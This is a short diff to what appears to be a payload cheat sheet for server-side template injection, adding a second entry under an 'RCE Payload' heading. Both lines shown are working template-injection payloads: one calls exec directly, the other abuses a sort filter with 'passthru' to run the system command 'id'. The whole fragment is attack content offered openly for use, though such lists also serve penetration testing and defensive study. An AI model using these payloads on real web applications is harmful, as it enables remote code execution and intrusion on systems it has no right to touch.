@@ -73,3 +73,5 @@
 ### RCE Payload
 
     {{exec('id')}}
+
+    {{['id',""]|sort('passthru')}}
